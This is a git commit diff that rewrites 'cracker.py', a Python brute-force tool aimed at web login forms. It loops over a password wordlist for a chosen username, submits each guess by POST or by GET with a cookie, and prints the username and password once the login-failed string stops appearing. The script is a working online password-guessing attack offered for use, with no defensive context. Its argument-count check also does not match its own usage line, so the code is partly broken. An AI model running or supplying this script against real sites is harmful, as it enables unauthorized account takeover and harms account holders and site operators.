47265cc3241d89f05f8da895973e187abbfcb757
Teja78906 <99752084+Teja78906@users.noreply.github.com>
2023-12-22 10:38:13 +0530

    Update cracker.py

--- cracker.py
+++ cracker.py
@@ -1,36 +1,38 @@
-
+import sys
 import requests
 from termcolor import colored
 
-url = input('[+] Enter Page URL: ')
-username = input('[+] Enter Username For The Account To Bruteforce: ')
-password_file = input('[+] Enter Password File To Use: ')
-login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
-cookie_value = input('Enter Cookie Value(Optional): ')
+def cracking(username, url, password_file, login_failed_string, cookie_value=''):
+    with open(password_file, 'r') as passwords:
+        for password in passwords:
+            password = password.strip()
+            print(colored(('Trying: ' + password), 'red'))
+            data = {'username': username, 'password': password, 'Login': 'submit'}
+            if cookie_value:
+                response = requests.get(url, params={'username': username, 'password': password, 'Login': 'Login'},
+                                        cookies={'Cookie': cookie_value})
+            else:
+                response = requests.post(url, data=data)
+            if login_failed_string in response.content.decode():
+                pass
+            else:
+                print(colored(('[+] Found Username: ==> ' + username), 'green'))
+                print(colored(('[+] Found Password: ==> ' + password), 'green'))
+                exit()
 
+if __name__ == "__main__":
+    if len(sys.argv) != 6 and len(sys.argv) != 7:
+        print("Usage: python bruteforce.py <URL> <Username> <PasswordFile> <LoginFailedString> [<CookieValue>]")
+        sys.exit(1)
 
-def cracking(username,url):
-	for password in passwords:
-		password = password.strip()
-		print(colored(('Trying: ' + password), 'red'))
-		data = {'username':username,'password':password,'Login':'submit'}
-		if cookie_value != '':
-			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
-		else:
-			response = requests.post(url, data=data)
-		if login_failed_string in response.content.decode():
-			pass
-		else:
-			print(colored(('[+] Found Username: ==> ' + username), 'green'))
-			print(colored(('[+] Found Password: ==> ' + password), 'green'))
-			exit()
+    url = sys.argv[1]
+    username = sys.argv[2]
+    password_file = sys.argv[3]
+    login_failed_string = sys.argv[4]
+    cookie_value = sys.argv[5] if len(sys.argv) == 7 else ''
 
+    cracking(username, url, password_file, login_failed_string, cookie_value)
+    print('[!!] Password Not In List')
 
-
-
-with open(password_file, 'r') as passwords:
-	cracking(username,url)
-
-print('[!!] Password Not In List')
 
 
